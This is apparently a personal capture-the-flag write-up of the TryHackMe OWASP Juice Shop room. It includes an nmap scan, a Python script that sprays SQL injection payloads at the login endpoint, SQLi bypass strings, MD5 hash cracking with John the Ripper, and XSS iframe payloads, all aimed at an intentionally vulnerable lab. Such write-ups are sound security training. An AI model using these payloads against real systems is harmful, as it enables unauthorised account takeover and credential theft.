# OWASP Juice Shop

## Task 1 - Connect To Our Network
```
export IP=10.10.200.134
```

## Task 2 - Configure Burp (If you haven't already)
## Task 3 - Walk Through The Application
Basic nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/OWASP_Juice_Shop$ sudo nmap -sC -sV -Pn -n -O $IP -oN nmap/initial.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 23:25 MDT
Nmap scan report for 10.10.200.134
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:d5:54:a8:17:cc:45:bd:8b:25:34:85:a7:cc:c6:49 (RSA)
|   256 eb:bd:8e:3e:6e:4d:23:ab:a2:09:5a:63:69:ea:83:87 (ECDSA)
|_  256 b1:bf:a7:9f:e3:90:28:ce:a8:aa:10:16:07:f9:82:46 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-robots.txt: 1 disallowed entry
|_/ftp
|_http-title: OWASP Juice Shop
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/15%OT=22%CT=1%CU=32470%PV=Y%DS=2%DC=I%G=Y%TM=5EBF797
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.32 seconds

```

## Task 4 - Injection
1. Log in with the administrator's user account using SQL Injection
Here I started by running a simple SQLi test script to run in the background, while I manually tested some low hanging fruit injections. Here is the script:
```python
#!/usr/bin/python3
import requests
import json
import os
payloads_path = '/opt/PayloadsAllTheThings/SQL Injection/Intruder'
url = 'http://10.10.200.134/rest/user/login'
data = {'email': '', 'password': ''}
for filename in os.listdir(payloads_path):
    with open(payloads_path + '/' + filename, 'r') as payload_handle:
        try:
            lines = [line.replace('\n', '') for line in payload_handle.readlines()]
            for payload in lines:
                if type(payload) is not str:
                    continue
                print('[+] Trying payload\t--->\t' + payload)
                data['email'] = payload
                data['password'] = payload
                response = requests.post(url=url, data=json.dumps(data))
                if response.ok:
                    print('[*] Successfully found SQLi!!!')
                    print('[*] Triggering payload\t--->\t' + payload)
                    exit(0)
                else:
                    print('[-] Request failed\t--->\t' + str(response.status_code))
        except Exception as err:
            print('Error Occured\t--->\t' + str(err))
```
While manually poking around, we found that the injection could be done by passing in something along the lines of:
```
email: ' OR 1=1; --'
password: ' OR 1=1; --'
```
Before diving into these SQLi problems head first, it is always best to start by doing some basic recon and just throwing some basic data into some of the fields. This will hellp determine information about whether to use single or double quotes, hyphen or sharp comments, etc. In the images below, we can see that just by sending in a single wuotes `admin '` we were able to not only tell that the database is SQLite, but also the exact query that is being run on the backend:
![sql_main_error](https://user-images.githubusercontent.com/32188816/82112128-5d0e3980-9707-11ea-8187-c77fde74f33c.png)
![sql_error](https://user-images.githubusercontent.com/32188816/82112146-8cbd4180-9707-11ea-87e0-9d935565ae4a.png)
Using this information it becomes easier to develop a successful payload.

## Task 5 - Broken Authentication
This task will involve looking at exploiting authentication through different logic flaws. When we talk about logic flaws within authentication, we include:
* forgotten password mechanisms
* exploiting bugs in the authentication process

1. reset Jim's password using the forgotten password mechanism - what was the answer to the secret question?
```
samuel
```
Sending the following payload as a POST to the `/rest/user/login` endpoint will allow us to login as Jim, and we can view his authentication token and decode the JWT to get the password hash and crack it with JtR like we did below in question 2 for the admin password.
```json
{"email":"jim@juice-sh.op' OR false; --","password":"' OR 1=1;--"}
```
Jim's password is `ncc-1701`, but we need to find his answer to the security question. Looking up ncc-1701 tells us that it is a starship from Star Trek, so what if we tried some names of characters from Star Trek? The captain of ncc-1701 is James T. Kirk, and the father of James is George Samuel Kirk, Sr. The security question is "Your eldest siblings the middle name", and we can guess that the answer is `samuel`.

2. What is the administrator password?
```
admin123
```
Using Burpsuite (or the browser dev console's network tab) we can obtain the response from a successful admin login via SQLi:
![burp](https://user-images.githubusercontent.com/32188816/82126883-d724d980-976c-11ea-9394-3af86a7e4127.png)
Looking at the format of the response, we get returned a dictionary containing an authentication token. The authentication token looks like it is just base64 encoded, so it is likely a JWT (JSON Web Token). Copying the token and decoding it (here I'm using hwt.io) we can see that encoded in the token is the admin password hash:
![jwt_password_hash](https://user-images.githubusercontent.com/32188816/82126885-d8560680-976c-11ea-9c34-698243b12d1f.png)
Now that we have the hash, we can give that to JtR to crack:
```bash
jeffrowell@kali:~/Documents/TryHackMe/OWASP_Juice_Shop$ echo '0192023a7bbd73250516f069df18b500' >> hash
jeffrowell@kali:~/Documents/TryHackMe/OWASP_Juice_Shop$ /opt/JohnTheRipper/run/john hash --format=raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/opt/JohnTheRipper/run/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
admin123         (?)
1g 0:00:00:17 DONE 3/3 (2020-05-16 11:58) 0.05707g/s 22788Kp/s 22788Kc/s 22788KC/s adv2kkle..admietia
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

## Task 6 - Sensitive Data Exposure

1. Access a confidential document and enter the name of the first file with the extension ".md"
```
acquisitions.md
```
From looking around on the site earlier, there is a "About Us" section that contains a link to "Check out our boring terms of use if you are interested in such lame stuff". Following that link brings us to the `/ftp/legal.md?md_debug=true` endpoint. So what happens if we just try to access `/ftp`? Here is what the result is:
![ftp](https://user-images.githubusercontent.com/32188816/82127311-cb86e200-976f-11ea-918e-4d3a784403bf.png)


## Task 7 - Broken Access Control
1. Access the administration section of the store - What is the name of the page?
```
administration
```

2. Access someone else's basket         
Accessing the `/#/basket` endpoint doesn't always bring you to your basket if you go through the URL instead of clicking the "Your Basket" button.

3. Get rid of all 5 star customer feedback     
Delete the feedback line items on the `/administration` page.


## Task 8 - Cross Site Scripting (XSS)

1. Carry out reflected XSS using Tracking Orders
```
<iframe src="javascript:alert(`xss`)">
```

2. Carry out XSS using the Search field?
```
<iframe src="javascript:alert(`xss`)">
```
